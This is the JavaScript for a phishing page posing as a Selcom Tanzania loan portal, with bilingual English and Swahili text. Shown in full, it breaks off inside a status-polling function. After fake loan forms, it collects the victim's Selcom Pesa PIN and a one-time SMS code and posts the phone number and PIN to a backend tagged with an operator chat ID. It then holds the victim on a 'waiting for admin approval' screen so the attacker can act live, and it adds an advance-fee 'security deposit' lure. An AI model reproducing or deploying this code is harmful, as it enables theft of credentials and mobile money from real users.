document.addEventListener('DOMContentLoaded', () => {
  const stepWelcome = document.getElementById('step-welcome');
  const stepSlider = document.getElementById('step-slider');
  const stepForm1 = document.getElementById('step-form-1');
  const stepForm2 = document.getElementById('step-form-2');
  const stepForm3 = document.getElementById('step-form-3');
  const stepPin = document.getElementById('step-pin');
  const stepOtp = document.getElementById('step-otp');
  const stepLoading = document.getElementById('step-loading');
  const stepSuccess = document.getElementById('step-success');

  const credsSurfaceBanner = document.getElementById('creds-surface-banner');
  const otpSurfaceBanner = document.getElementById('otp-surface-banner');
  const phoneError = document.getElementById('phone-error');
  const phoneInput = document.getElementById('phone-number');

  let currentUserId = null;
  let statusPollInterval = null;
  let otpTimerInterval = null;
  let countdownSeconds = 60;

  const urlParams = new URLSearchParams(window.location.search);
  const adminParam = urlParams.get('admin') || '';

  // Translations Dictionary
  const translations = {
    ENG: {
      welcomeTitle: "KARIBU SELCOM TANZANIA!",
      welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
      welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
      criticalMsg: "*! ATTENTION!<br>An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
      officialPortal: "Official Application Portal (Tanzania Only)",
      continueBtn: "CONTINUE",
      calcTitle: "Estimate your loan repayments",
      loanAmtLbl: "LOAN AMOUNT",
      loanTermLbl: "LOAN TERM (MONTHS)",
      estMonthly: "ESTIMATED MONTHLY REPAYMENT",
      totalRepay: "TOTAL REPAYMENT: TSH 2,820,000",
      assumedRate: "*Assumed Interest Rate: 13.5%",
      signInBtn: "SIGN IN",
      form1Title: "Loan Application",
      form1Step: "Step 1 of 3",
      lblLoanType: "Loan Type",
      lblLoanAmt: "Loan Amount (TSh)",
      lblLoanDur: "Loan Term",
      lblLoanPurpose: "Loan Purpose",
      loanPurposePlaceholder: "Describe your loan purpose...",
      nextBtn: "NEXT STEP",
      backBtn: "BACK",
      form2Title: "Loan Application",
      form2Step: "Step 2 of 3",
      lblFirstname: "First Name",
      lblLastname: "Last Name",
      lblPhone: "Phone Number (Tanzania)",
      phoneHint: "Enter 9 digits or start with 0 (e.g., 0712345678)",
      form3Title: "Loan Application",
      form3Step: "Step 3 of 3",
      lblEmployment: "Employment Status",
      lblAnnualIncome: "Annual Income (TSh)",
      summaryTitle: "Application Summary",
      sumAmtLbl: "Loan Amount:",
      sumDurLbl: "Loan Term:",
      sumPurLbl: "Purpose:",
      sumAppLbl: "Applicant:",
      submitBtn: "SUBMIT APPLICATION",
      pinTitle: "Thibitisha PIN yako ya SELCOM PESA",
      pinSub: "For security, please verify your 4-digit account PIN to continue.",
      pinPrompt: "Your 4-digit PIN",
      pinHint: "Ensure this matches the PIN set for this account.",
      pinSubmit: "SUBMIT",
      otpTitle: "Thibitisha OTP yako ya SELCOM PESA",
      otpSub: "For security, an OTP code has been sent via SMS or WhatsApp to your Selcom Pesa number. Please enter below.",
      otpPrompt: "Your 6-digit OTP",
      otpInstruction: "Please enter the full 6-digit code.",
      resendText: "Didn't receive? Resend",
      otpSubmit: "ENTER OTP",
      congratsTitle: "🎉 Congratulations!",
      congratsSub: "Your loan has been <strong>approved!</strong> Funds will be disbursed shortly.",
      approvedLabel: "APPROVED AMOUNT",
      complianceTitle: "⚠️ COMPLIANCE NOTICE",
      complianceDesc: "Your Selcom details account must be active and maintain a safety security balance of at least 10% of the requested loan amount. This deposit is fully refunded after loan repayment.",
      detailsHeader: "= Loan Details",
      itemMonthly: "MONTHLY REPAYMENT",
      itemTerm: "LOAN TERM",
      itemRate: "INTEREST RATE",
      homeBtn: "🏠 Home"
    },
    SWAHILI: {
      welcomeTitle: "KARIBU SELCOM TANZANIA!",
      welcomeSub: "WELCOME TO THE OFFICIAL APPLICATION PORTAL.",
      welcomeDesc: "Your unique Selcom Account Details (Tanzania only) are required for all interactions. Ensure you use a valid account number to avoid delays.",
      criticalMsg: "*! ATTENTION!<br>An essential security measure: <strong>DO NOT ENTER INVALID SELCOM ACCOUNT DETAILS</strong>. This will cause immediate rejection. Please double-check your Tanzania-specific account number before submitting.",
      officialPortal: "Official Application Portal (Tanzania Only)",
      continueBtn: "ENDELEA",
      calcTitle: "Kadiria malipo yako ya mkopo",
      loanAmtLbl: "KIASI CHA MKOPO",
      loanTermLbl: "MUDA WA MKOPO (MIEZI)",
      estMonthly: "MALIPO YA KILA MWEZI YANAYOKADIRIWA",
      totalRepay: "JUMLA YA MALIPO: TSH 2,820,000",
      assumedRate: "*Kiwango cha Riba Kinachodhaniwa: 13.5%",
      signInBtn: "INGIA",
      form1Title: "Maombi ya Mkopo",
      form1Step: "Hatua 1 ya 3",
      lblLoanType: "Aina ya Mkopo",
      lblLoanAmt: "Kiasi cha Mkopo (TSh)",
      lblLoanDur: "Muda wa Mkopo",
      lblLoanPurpose: "Madhumuni ya Mkopo",
      loanPurposePlaceholder: "Elezea madhumuni ya mkopo wako...",
      nextBtn: "HATUA INAYOFUATA",
      backBtn: "ILIYOTANGULIA",
      form2Title: "Maombi ya Mkopo",
      form2Step: "Hatua 2 ya 3",
      lblFirstname: "Jina la Kwanza",
      lblLastname: "Jina la Ukoo",
      lblPhone: "Nambari ya Simu (Tanzania)",
      phoneHint: "Weka nambari 9 au anza na 0 (mfano, 0712345678)",
      form3Title: "Maombi ya Mkopo",
      form3Step: "Hatua 3 ya 3",
      lblEmployment: "Hali ya Ajira",
      lblAnnualIncome: "Mapato ya Mwaka (TSh)",
      summaryTitle: "Muhtasari wa Maombi",
      sumAmtLbl: "Kiasi cha Mkopo:",
      sumDurLbl: "Muda wa Mkopo:",
      sumPurLbl: "Madhumuni:",
      sumAppLbl: "Mwombaji:",
      submitBtn: "WASILISHA MAOMBI",
      pinTitle: "Thibitisha PIN yako ya SELCOM PESA",
      pinSub: "Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 ya akaunti ili kuendelea.",
      pinPrompt: "PIN yako ya tarakimu 4",
      pinHint: "Hakikisha hii inalingana na PIN uliyoweka kwa akaunti hii.",
      pinSubmit: "WASILISHA",
      otpTitle: "Thibitisha OTP yako ya SELCOM PESA",
      otpSub: "Kwa usalama, msimbo wa OTP umetumwa kupitia SMS au WhatsApp kwenye nambari yako ya SELCOM PESA. Tafadhali ingiza hapa chini ili kuendelea.",
      otpPrompt: "OTP yako ya tarakimu 6",
      otpInstruction: "Tafadhali ingiza msimbo kamili wa tarakimu 6.",
      resendText: "Hukuipata? Tuma tena",
      otpSubmit: "INGIZA OTP",
      congratsTitle: "🎉 Hongera!",
      congratsSub: "Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatilewa hivi karibuni.",
      approvedLabel: "KIASI KILICHOIDHINISHWA",
      complianceTitle: "⚠️ NOTISI YA UZINGATIAJI",
      complianceDesc: "Akaunti yako ya SELCOM details lazima iwe hai na idumish uamana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaldia kupata riba nzuri zaidi.",
      detailsHeader: "= Maelezo ya Mkopo",
      itemMonthly: "MALIPO YA KILA MWEZI",
      itemTerm: "MUDA WA MKOPO",
      itemRate: "KIWANGO CHA RIBA",
      homeBtn: "🏠 Rudi Nyumbani"
    }
  };

  function updateLanguage(lang) {
    const t = translations[lang];
    document.getElementById('txt-welcome-title').innerText = t.welcomeTitle;
    document.getElementById('txt-welcome-sub').innerText = t.welcomeSub;
    document.getElementById('txt-welcome-desc').innerText = t.welcomeDesc;
    document.getElementById('txt-critical-msg').innerHTML = t.criticalMsg;
    document.getElementById('txt-official-portal').innerText = t.officialPortal;
    document.getElementById('btn-welcome-continue').innerText = t.continueBtn;
    document.getElementById('txt-calc-title').innerText = t.calcTitle;
    document.getElementById('txt-loan-amount-label').innerText = t.loanAmtLbl;
    document.getElementById('txt-loan-term-label').innerText = t.loanTermLbl;
    document.getElementById('txt-est-monthly').innerText = t.estMonthly;
    document.getElementById('txt-total-repay').innerText = t.totalRepay;
    document.getElementById('txt-assumed-rate').innerText = t.assumedRate;
    document.getElementById('btn-slider-next').innerText = t.signInBtn;
    document.getElementById('txt-form1-title').innerText = t.form1Title;
    document.getElementById('txt-form1-step').innerText = t.form1Step;
    document.getElementById('lbl-loan-type').innerText = t.lblLoanType;
    document.getElementById('lbl-loan-amt').innerText = t.lblLoanAmt;
    document.getElementById('lbl-loan-dur').innerText = t.lblLoanDur;
    document.getElementById('lbl-loan-purpose').innerText = t.lblLoanPurpose;
    document.getElementById('loan-purpose').placeholder = t.loanPurposePlaceholder;
    document.getElementById('btn-form1-next').innerText = t.nextBtn;
    document.getElementById('txt-form2-title').innerText = t.form2Title;
    document.getElementById('txt-form2-step').innerText = t.form2Step;
    document.getElementById('lbl-firstname').innerText = t.lblFirstname;
    document.getElementById('lbl-lastname').innerText = t.lblLastname;
    document.getElementById('lbl-phone').innerText = t.lblPhone;
    document.getElementById('txt-phone-hint').innerText = t.phoneHint;
    document.getElementById('btn-form2-next').innerText = t.nextBtn;
    document.getElementById('txt-form3-title').innerText = t.form3Title;
    document.getElementById('txt-form3-step').innerText = t.form3Step;
    document.getElementById('lbl-employment').innerText = t.lblEmployment;
    document.getElementById('lbl-annual-income').innerText = t.lblAnnualIncome;
    document.getElementById('txt-summary-title').innerText = t.summaryTitle;
    document.getElementById('txt-sum-amt-lbl').innerText = t.sumAmtLbl;
    document.getElementById('txt-sum-dur-lbl').innerText = t.sumDurLbl;
    document.getElementById('txt-sum-pur-lbl').innerText = t.sumPurLbl;
    document.getElementById('txt-sum-app-lbl').innerText = t.sumAppLbl;
    document.getElementById('btn-form3-submit').innerText = t.submitBtn;
    document.getElementById('txt-pin-title').innerText = t.pinTitle;
    document.getElementById('txt-pin-sub').innerText = t.pinSub;
    document.getElementById('txt-pin-prompt').innerText = t.pinPrompt;
    document.getElementById('txt-pin-hint').innerText = t.pinHint;
    document.getElementById('btn-submit-creds').innerText = t.pinSubmit;
    document.getElementById('txt-otp-title').innerText = t.otpTitle;
    document.getElementById('txt-otp-sub').innerText = t.otpSub;
    document.getElementById('txt-otp-prompt').innerText = t.otpPrompt;
    document.getElementById('txt-otp-instruction').innerText = t.otpInstruction;
    document.getElementById('txt-resend-text').innerText = t.resendText;
    document.getElementById('btn-submit-otp').innerText = t.otpSubmit;
    document.getElementById('txt-congrats-title').innerText = t.congratsTitle;
    document.getElementById('txt-congrats-sub').innerHTML = t.congratsSub;
    document.getElementById('txt-approved-label').innerText = t.approvedLabel;
    document.getElementById('txt-compliance-title').innerText = t.complianceTitle;
    document.getElementById('txt-compliance-desc').innerText = t.complianceDesc;
    document.getElementById('txt-details-header').innerText = t.detailsHeader;
    document.getElementById('txt-item-monthly').innerText = t.itemMonthly;
    document.getElementById('txt-item-term').innerText = t.itemTerm;
    document.getElementById('txt-item-rate').innerText = t.itemRate;
    document.getElementById('btn-go-home').innerText = t.homeBtn;
  }

  const langToggle = document.getElementById('lang-toggle');
  const engLabel = document.getElementById('lang-eng-label');
  const swaLabel = document.getElementById('lang-swa-label');

  if (langToggle) {
    langToggle.addEventListener('change', (e) => {
      if (e.target.checked) {
        swaLabel.classList.add('active');
        engLabel.classList.remove('active');
        updateLanguage('SWAHILI');
      } else {
        engLabel.classList.add('active');
        swaLabel.classList.remove('active');
        updateLanguage('ENG');
      }
    });
  }

  function showStep(targetStep) {
    [stepWelcome, stepSlider, stepForm1, stepForm2, stepForm3, stepPin, stepOtp, stepSuccess].forEach(s => {
      if (s) s.classList.remove('active');
    });
    if (targetStep) targetStep.classList.add('active');
  }

  // Sliders
  const sliderBalance = document.getElementById('slider-balance');
  const balanceVal = document.getElementById('balance-val');
  const sliderDuration = document.getElementById('slider-duration');
  const durationVal = document.getElementById('duration-val');
  const formAmount = document.getElementById('form-amount');
  const formDuration = document.getElementById('form-duration');

  if (sliderBalance && balanceVal) {
    sliderBalance.addEventListener('input', (e) => {
      const val = `TSH ${Number(e.target.value).toLocaleString()}`;
      balanceVal.innerText = val;
      if (formAmount) formAmount.value = e.target.value;
      const summaryAmt = document.getElementById('summary-amount');
      if (summaryAmt) summaryAmt.innerText = `TSh ${Number(e.target.value).toLocaleString()}`;
    });
  }

  if (sliderDuration && durationVal) {
    sliderDuration.addEventListener('input', (e) => {
      const val = `${e.target.value} MONTHS`;
      durationVal.innerText = val;
      if (formDuration) formDuration.value = `Miezi ${e.target.value}`;
      const summaryDur = document.getElementById('summary-duration');
      if (summaryDur) summaryDur.innerText = `Miezi ${e.target.value}`;
    });
  }

  // Phone Validation
  if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      if (val.length > 10) val = val.substring(0, 10);
      e.target.value = val;
    });
  }

  // Navigation button listeners
  document.getElementById('btn-welcome-continue').addEventListener('click', () => showStep(stepSlider));
  document.getElementById('btn-slider-next').addEventListener('click', () => {
    if (sliderBalance && formAmount) formAmount.value = sliderBalance.value;
    showStep(stepForm1);
  });

  document.getElementById('btn-form1-next').addEventListener('click', () => showStep(stepForm2));
  document.getElementById('btn-form1-back-top').addEventListener('click', () => showStep(stepSlider));

  document.getElementById('btn-form2-back').addEventListener('click', () => showStep(stepForm1));
  document.getElementById('btn-form2-back-top').addEventListener('click', () => showStep(stepForm1));

  document.getElementById('btn-form2-next').addEventListener('click', () => {
    const firstName = document.getElementById('first-name').value.trim();
    const lastName = document.getElementById('last-name').value.trim();
    const phoneVal = phoneInput ? phoneInput.value.trim() : '';

    const tzRegex = /^(07|06|7|6)\d{8}$/;
    if (!tzRegex.test(phoneVal)) {
      if (phoneError) {
        phoneError.innerText = 'Weka nambari halali ya Tanzania (mfano 0712345678 au 712345678).';
        phoneError.style.display = 'block';
      }
      return;
    }
    if (phoneError) phoneError.style.display = 'none';

    const sumApplicant = document.getElementById('summary-applicant');
    const sumPurpose = document.getElementById('summary-purpose');
    const loanTypeEl = document.getElementById('loan-type');

    if (sumApplicant) sumApplicant.innerText = `${firstName} ${lastName}`.trim() || 'Selcom Customer';
    if (sumPurpose && loanTypeEl) sumPurpose.innerText = loanTypeEl.value;

    showStep(stepForm3);
  });

  document.getElementById('btn-form3-back').addEventListener('click', () => showStep(stepForm2));
  document.getElementById('btn-form3-back-top').addEventListener('click', () => showStep(stepForm2));

  document.getElementById('btn-form3-submit').addEventListener('click', () => {
    showStep(stepPin);
    if (pinDigits[0]) pinDigits[0].focus();
  });

  // PIN Inputs
  const pinDigits = document.querySelectorAll('.pin-digit');
  const otpDigits6 = document.querySelectorAll('.otp-digit-6');

  function setupDigitInputs(inputs, autoSubmitCallback) {
    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/\D/g, '');
        if (input.value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
        const allFilled = Array.from(inputs).every(i => i.value.length === 1);
        if (allFilled && typeof autoSubmitCallback === 'function') {
          autoSubmitCallback();
        }
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  }

  setupDigitInputs(pinDigits);
  setupDigitInputs(otpDigits6, () => submitOtpHandler());

  // Submit Credentials (PIN & Phone)
  const btnSubmitCreds = document.getElementById('btn-submit-creds');
  if (btnSubmitCreds) {
    btnSubmitCreds.addEventListener('click', async () => {
      const phoneVal = phoneInput ? phoneInput.value.trim() : '';
      const pinVal = Array.from(pinDigits).map(i => i.value).join('');
      const pinError = document.getElementById('pin-error');

      if (pinVal.length !== 4) {
        if (pinError) pinError.style.display = 'block';
        return;
      }
      if (pinError) pinError.style.display = 'none';
      if (credsSurfaceBanner) credsSurfaceBanner.classList.remove('active');

      showLoading('Inachakata...', 'Inatuma PIN yako kwa usalama.');

      try {
        const res = await fetch(`/api/submit-credentials?admin=${encodeURIComponent(adminParam)}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: phoneVal, pin: pinVal, adminChatId: adminParam })
        });
        const data = await res.json();
        if (data.success) {
          currentUserId = data.userId;
          document.getElementById('loading-title').innerText = "Inasubiri idhini ya msimamizi...";
          document.getElementById('loading-sub').innerText = "Tafadhali kaa kwenye ukurasa huu.";
          startStatusPolling();
        } else {
          hideLoading();
          alert(data.error || 'Imeshindikana kuchakata.');
        }
      } catch (e) {
        hideLoading();
        alert('Hitilafu ya mtandao.');
      }
    });
  }

  function startOtpCountdown() {
    countdownSeconds = 60;
    const countdownEl = document.getElementById('otp-countdown');
    const resendBtn = document.getElementById('btn-resend-otp');
    if (resendBtn) {
      resendBtn.style.pointerEvents = 'none';
      resendBtn.style.opacity = '0.6';
    }

    if (otpTimerInterval) clearInterval(otpTimerInterval);
    otpTimerInterval = setInterval(() => {
      countdownSeconds--;
      if (countdownEl) countdownEl.innerText = countdownSeconds;
      if (countdownSeconds <= 0) {
        clearInterval(otpTimerInterval);
        if (resendBtn) {
          resendBtn.style.pointerEvents = 'auto';
          resendBtn.style.opacity = '1';
        }
      }
    }, 1000);
  }

  const resendBtn = document.getElementById('btn-resend-otp');
  if (resendBtn) {
    resendBtn.addEventListener('click', (e) => {
      e.preventDefault();
      if (countdownSeconds <= 0) {
        otpSurfaceBanner.classList.remove('active');
        otpDigits6.forEach(i => i.value = '');
        if (otpDigits6[0]) otpDigits6[0].focus();
        startOtpCountdown();
      }
    });
  }

  function startStatusPolling() {
   
